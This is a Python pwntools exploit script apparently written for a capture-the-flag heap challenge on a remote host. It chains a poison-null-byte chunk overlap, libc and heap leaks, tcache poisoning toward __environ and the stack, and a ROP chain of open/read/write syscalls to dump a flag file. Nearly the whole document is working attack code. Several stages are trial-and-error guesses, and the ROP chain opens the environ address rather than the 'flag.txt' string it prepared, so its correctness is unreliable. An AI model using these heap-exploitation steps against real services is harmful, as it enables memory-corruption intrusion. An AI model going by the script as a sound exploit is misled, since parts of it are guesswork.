#!/usr/bin/env python3
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'info'

HOST, PORT = 'chall.0xfun.org', 11724
LOCAL = '--local' in sys.argv

# Libc offsets
MAIN_ARENA = 0x1e7ac0
ENVIRON    = 0x1eee28

# ROP gadgets
POP_RDI    = 0x102dea
POP_RSI    = 0x53847
POP_RAX    = 0xd4f97
SYSCALL_R  = 0x93a75
XOR_EDX    = 0x40363
POP_RDX_R12 = 0x11c371

def conn():
    return process('./chall') if LOCAL else remote(HOST, PORT)

def sl(io):
    io.recvuntil(b'> ')

def add(io, idx, size, data=b''):
    sl(io)
    io.sendline(b'1')
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Size: ')
    io.sendline(str(size).encode())
    io.recvuntil(b'Data: ')
    if len(data) < size:
        data = data.ljust(size, b'\x00')
    io.send(data[:size])
    io.recvuntil(b'Created!\n')

def delete(io, idx):
    sl(io)
    io.sendline(b'2')
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Deleted!\n')

def show(io, idx):
    sl(io)
    io.sendline(b'3')
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Data: ')
    data = io.recvline(drop=True)
    return data

def edit(io, idx, data):
    sl(io)
    io.sendline(b'4')
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Data: ')
    io.send(data)
    io.recvuntil(b'Updated!\n')

def exploit():
    io = conn()
    
    log.info("Stage 1: Heap feng shui for poison null byte")
    
    # Create chunks with specific sizes
    # The key is: after freeing and reallocating, chunk B must overlap freed space
    add(io, 0, 0x518, b'A' * 0x10)   # Large chunk (will be 0x520 with metadata)
    add(io, 1, 0xf8, b'B' * 0x10)    # Small chunk (0x100)
    add(io, 2, 0x518, b'C' * 0x10)   # Large chunk (0x520)
    add(io, 3, 0x18, b'GUARD')       # Guard against consolidation with top
    
    log.info("Stage 2: Execute poison null byte")
    
    # Free chunk 0 to unsorted bin
    delete(io, 0)
    
    # Overflow from chunk 1 to corrupt chunk 2's size
    # Write fake prev_size and let off-by-one clear PREV_INUSE bit
    payload = b'X' * 0xf0
    payload += p64(0x620)  # Fake prev_size (0x520 + 0x100)
    edit(io, 1, payload)
    
    # Free chunk 2 - should trigger backward consolidation
    delete(io, 2)
    
    log.info("Stage 3: Recreate chunks to expose libc pointers")
    
    # Now the consolidated chunk is in unsorted bin
    # Allocate chunk 0 back - this splits the large free chunk
    add(io, 0, 0x518, b'')  # Don't write data, leave pointers intact
    
    # The remainder is still in unsorted bin with fd/bk pointers
    # Now chunk 1 should be able to see into this freed space
    # BUT - we need to allocate something else first to leave a remainder
    
    # Allocate a chunk that's smaller than the remainder
    # This will split it and leave some in unsorted bin
    add(io, 4, 0x500, b'')  # Take most of the remainder
    
    # Now there should be a small remainder in unsorted bin with libc pointers
    # OR the chunk we just allocated (idx 4) might have unsorted bin pointers at the end
    
    log.info("Attempting to leak libc...")
    
    # Try to read from chunk 1 - it might overlap with freed space
    leak_data = show(io, 1)
    log.info(f"Chunk 1 data length: {len(leak_data)}")
    
    if len(leak_data) >= 8:
        leak = u64(leak_data[:8])
        log.info(f"Leak from chunk 1: {hex(leak)}")
    else:
        leak = 0
    
    # If that didn't work, try chunk 4 - allocate and free to see pointers
    if leak == 0 or leak < 0x7f0000000000:
        log.info("Chunk 1 didn't work, trying different approach...")
        
        # Free chunk 4 - it should go to unsorted bin
        delete(io, 4)
        
        # Allocate it back WITHOUT writing data
        add(io, 4, 0x500, b'')
        
        # Now show it - might have stale pointers
        leak_data = show(io, 4)
        log.info(f"Chunk 4 data length: {len(leak_data)}")
        
        if len(leak_data) >= 8:
            leak = u64(leak_data[:8])
            log.info(f"Leak from chunk 4: {hex(leak)}")
    
    # Still no leak? Try yet another approach
    if leak == 0 or leak < 0x7f0000000000:
        log.info("Trying to create unsorted bin chunk and read it...")
        
        # Allocate large chunk and free it
        add(io, 5, 0x600, b'')
        delete(io, 5)
        
        # Allocate it back without overwriting
        add(io, 5, 0x600, b'')
        leak_data = show(io, 5)
        
        if len(leak_data) >= 8:
            leak = u64(leak_data[:8])
            log.info(f"Leak from chunk 5: {hex(leak)}")
    
    # One more approach - use the overlap properly
    if leak == 0 or leak < 0x7f0000000000:
        log.info("Using overlap - reallocating to expose pointers in chunk 1...")
        
        # After the consolidation, chunk 1 should overlap freed memory
        # Delete chunk 0 again
        delete(io, 0)
        
        # Now chunk 1 should be inside freed space
        leak_data = show(io, 1)
        
        if len(leak_data) >= 8:
            leak = u64(leak_data[:8])
            log.info(f"Leak after deleting chunk 0: {hex(leak)}")
    
    # Validate leak
    if leak == 0 or not (0x7f0000000000 < leak < 0x800000000000):
        log.error(f"Failed to get valid libc leak: {hex(leak)}")
        log.info("Full leak data:")
        log.info(leak_data.hex() if leak_data else "No data")
        
        # Interactive mode to debug
        log.warning("Dropping to interactive mode for debugging")
        io.interactive()
        return
    
    # Calculate libc base
    libc_base = None
    for offset in range(0x50, 0xd0, 0x10):
        candidate = leak - MAIN_ARENA - offset
        if (candidate & 0xfff) == 0:
            libc_base = candidate
            log.info(f"Found libc with offset {hex(offset)}")
            break
    
    if not libc_base:
        libc_base = leak - MAIN_ARENA - 0x60
        log.warning(f"Using default offset, libc might be wrong")
    
    log.success(f"Libc base: {hex(libc_base)}")
    
    # Calculate gadgets
    environ_addr = libc_base + ENVIRON
    pop_rdi = libc_base + POP_RDI
    pop_rsi = libc_base + POP_RSI
    pop_rax = libc_base + POP_RAX
    pop_rdx_r12 = libc_base + POP_RDX_R12
    syscall_ret = libc_base + SYSCALL_R
    xor_edx = libc_base + XOR_EDX
    
    log.info(f"__environ: {hex(environ_addr)}")
    
    # === Stage 4: Heap leak ===
    log.info("Stage 4: Heap leak")
    
    # Allocate and free chunks for tcache
    add(io, 6, 0xf8, b'H1')
    add(io, 7, 0xf8, b'H2')
    delete(io, 7)
    delete(io, 6)
    
    # Chunk 6 should have mangled fd
    # We need to read it - if chunk 1 overlaps, we might see it
    # Otherwise allocate and immediately read
    add(io, 6, 0xf8, b'')
    heap_data = show(io, 6)
    
    if len(heap_data) >= 8:
        heap_leak = u64(heap_data[:8])
        if heap_leak > 0:
            heap_key = heap_leak >> 12
            log.success(f"Heap key: {hex(heap_key)}")
        else:
            heap_key = 0
            log.warning("No heap leak, using 0")
    else:
        heap_key = 0
    
    # === Stage 5: Tcache poison for environ ===
    log.info("Stage 5: Poisoning tcache to leak stack")
    
    delete(io, 6)
    
    # Poison fd to point to __environ
    target = heap_key ^ environ_addr
    
    # Edit chunk 6's fd through chunk 1 overlap OR direct edit
    # Try direct: allocate, write poisoned fd, free
    add(io, 6, 0xf8, p64(target))
    delete(io, 6)
    
    # Allocate twice
    add(io, 8, 0xf8, b'flag.txt\x00')
    add(io, 9, 0xf8, b'')
    
    # Read stack from __environ
    stack_data = show(io, 9)
    if len(stack_data) >= 8:
        stack_leak = u64(stack_data[:8])
        log.success(f"Stack: {hex(stack_leak)}")
    else:
        log.error("No stack leak")
        io.interactive()
        return
    
    # === Stage 6: ROP ===
    log.info("Stage 6: Writing ROP chain")
    
    ret_addr = stack_leak - 0x120
    buf = ret_addr + 0x300
    
    rop = flat([
        pop_rdi, environ_addr,
        pop_rsi, 0,
        xor_edx,
        pop_rax, 2,
        syscall_ret,
        
        pop_rdi, 3,
        pop_rsi, buf,
        pop_rdx_r12, 0x100, 0,
        pop_rax, 0,
        syscall_ret,
        
        pop_rdi, 1,
        pop_rsi, buf,
        pop_rdx_r12, 0x100, 0,
        pop_rax, 1,
        syscall_ret,
    ])
    
    # Poison tcache to stack
    add(io, 10, 0xf8, b'X')
    add(io, 11, 0xf8, b'Y')
    delete(io, 11)
    delete(io, 10)
    
    target2 = heap_key ^ ret_addr
    add(io, 10, 0xf8, p64(target2))
    delete(io, 10)
    
    add(io, 12, 0xf8, b'Z')
    add(io, 13, 0xf8, rop[:0xf8])
    
    log.success("ROP written, triggering...")
    
    sl(io)
    io.sendline(b'5')
    
    output = io.recvall(timeout=3)
    log.success(f"Output:\n{output.decode(errors='ignore')}")
    
    io.close()

if __name__ == '__main__':
    exploit()
